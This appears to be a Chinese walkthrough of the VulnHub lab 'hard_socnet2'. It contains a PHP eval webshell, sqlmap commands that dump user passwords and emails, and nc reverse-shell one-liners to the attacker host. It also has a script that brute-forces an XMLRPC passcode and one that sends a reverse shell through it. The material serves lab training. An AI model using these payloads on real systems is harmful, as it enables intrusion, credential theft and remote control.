> 靶机环境介绍
+ [hard_socnet2](https://www.vulnhub.com/entry/boredhackerblog-social-network-20,455/) 
+ 难度等级 <font color=red>高</font>

目标: 取得root权限

**所用技术栈：**
+ 主机发现
+ 端口扫描
+ SQL注入
+ 文件上传
+ 蚁剑上线
+ **XMLRPC命令执行**
+ 逆向工程
+ 动态调试
+ 漏洞利用代码编写



我们进行 `OPTIONS`,`DELETE`,`POST`,`GET`,`PUT` 等一系列方式对服务器进行请求

这个时候我们可以去访问其 80 端口


+ [AntSword Shell Script](https://github.com/AntSwordProject/AwesomeScript) 
+ [Many Demo Shell Download](https://privdayz.com/)


```php
<?php
@eval($_REQUEST['ant']);
show_source(__FILE__);
?>
```

```bash
sqlmap -r req -p query --dbs

sqlmap -r req -p query -D socialnetwork --tables

sqlmap -r req -p query -D socialnetwork -T users --columns

sqlmap -r req -p query -D socialnetwork -T users -C user_password,user_email --dump

```


[CVE-2021-3493 漏洞利用代码](https://github.com/briskets/CVE-2021-3493) 
```bash

rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.0.2.7 3333 >/tmp/f

```

```python
python -c "import pty;pty.spawn('/bin/bash');"
```
<++>
而这个漏洞是在最近 也就是 2021 年才发现的，而这台靶机却是 2018 年就发布了，也就是说在当时并不知道这个漏洞,所以在这台靶机上一定还有另外的提权方式

```python
#my remote server management API
import SimpleXMLRPCServer
import subprocess
import random

debugging_pass = random.randint(1000,9999)

def runcmd(cmd):
    results = subprocess.Popen(cmd, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
    output = results.stdout.read() + results.stderr.read()
    return output

def cpu():
    return runcmd("cat /proc/cpuinfo")

def mem():
    return runcmd("free -m")

def disk():
    return runcmd("df -h")

def net():
    return runcmd("ip a")

def secure_cmd(cmd,passcode):
    if passcode==debugging_pass:
         return runcmd(cmd)
    else:
        return "Wrong passcode."

server = SimpleXMLRPCServer.SimpleXMLRPCServer(("0.0.0.0", 8000))
server.register_function(cpu)
server.register_function(mem)
server.register_function(disk)
server.register_function(net)
server.register_function(secure_cmd)

server.serve_forever()

```

所以我们就可以去网上搜索一下关于 XMLRPC 相关的内容

发现我们可以通过远程的方式执行目标靶机上的命令

通过审计 我们可以编写一下 exp 来利用这个漏洞

```python
import xmlrpc.client

with xmlrpc.client.ServerProxy("http://10.0.2.8:8000/") as proxy:
	for i in range(1000,10000):
		if str(proxy.secure_cmd("ls",i)) != "Wrong passcode.":
			print("The passwd is {}".format(i))
		else:
			pass
	
```

```python
import xmlrpc.client

with xmlrpc.client.ServerProxy("http://10.0.2.8:8000/") as proxy:
    cmd = "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.0.2.7 4444 >/tmp/f"
    res = str(proxy.secure_cmd(cmd,5784))
    print(res)


```




